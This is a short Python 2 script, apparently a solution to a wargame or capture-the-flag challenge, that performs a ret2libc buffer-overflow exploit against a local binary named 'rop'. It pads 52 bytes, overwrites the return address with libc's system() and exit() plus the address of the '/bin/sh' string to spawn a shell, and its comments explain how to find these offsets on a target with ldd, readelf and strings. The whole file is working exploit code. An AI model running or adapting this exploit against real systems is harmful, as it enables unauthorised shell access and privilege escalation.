from subprocess import call
import struct


#see below, how to get these values
libc_base_addr = 0xb7e19000 
system_off = 0x0003ada0
exit_off = 0x0002e9d0
arg_off = 0x0015ba0b


system_addr = struct.pack("<I",libc_base_addr+system_off) 
exit_addr = struct.pack("<I",libc_base_addr+exit_off)
arg_addr = struct.pack("I",libc_base_addr+arg_off)


buf = "A" * 52
buf += system_addr
buf += exit_addr
buf += arg_addr


i = 0
while (i< 3):
	print  "Try: %s " %i
	i +=1
	ret = call(["/home/ayush/.binary/rop",buf])


########################################################################################
#get value using these command on server
#value for "libc_base_addr" 
#ldd rop | grep libc

#value for "system_off"
#readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system    (copy "system@@GLIBC_2.0" addr)

#value for "exit_off"
#readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit      (copy "exit@@GLIBC_2.0" addr) 

#value for "arg_off"
#strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
########################################################################################

